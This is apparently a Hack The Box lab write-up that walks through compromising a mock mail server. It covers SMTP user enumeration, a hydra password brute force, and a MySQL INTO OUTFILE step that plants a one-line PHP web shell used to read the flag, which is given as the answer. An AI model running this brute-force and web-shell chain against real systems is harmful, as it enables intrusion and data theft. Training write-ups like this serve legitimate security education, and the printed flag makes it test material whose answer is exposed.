We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format:

- `HTB{...}`

Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.

### Questions 
You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer.
### Solutions
```shell
> nmap -sC -sV 10.129.203.7
21/tcp   open  ftp
25/tcp   open  smtp     hMailServer smtpd
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
443/tcp  open  https         Core FTP HTTPS Server
587/tcp  open  smtp          hMailServer smtpd
3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
3389/tcp open  ms-wbt-server Microsoft Terminal Services


SMTP user enum:
> smtp-user-enum -m RCPT -U users.list -d inlanefreight.htb 10.129.203.7 25
[SUCC] fiona         250 OK

Brute force with hydra:
> hydra -l 'fiona@inlanefreight.htb' -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt -f 10.129.203.7 smtp -V -I -s 25

login: fiona@inlanefreight.htb   password: 987654321

fiona:987654321
```

```shell
> mysql -u fiona -p -h 10.129.107.193

sql> show variables like "secure_file_priv"
Variable is empty so we can upload file through mysql

sql> SELECT "<?=`$_GET[0]`?>" INTO OUTFILE 'C:/xampp/htdocs/dashboard/phpinfo3.php'
We upload it there because we know that it's a xampp server and it is the default location of file for this type of server.

(Le dossier `htdocs`, où vous devez placer vos fichiers web, est situé dans `C:\xampp\htdocs`)



Then We just have to access this webshell:
http://10.129.107.193/dashboard/phpinfo3.php?0=type+C:\Users\administrator\desktop\flag.txt

Answer: HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
```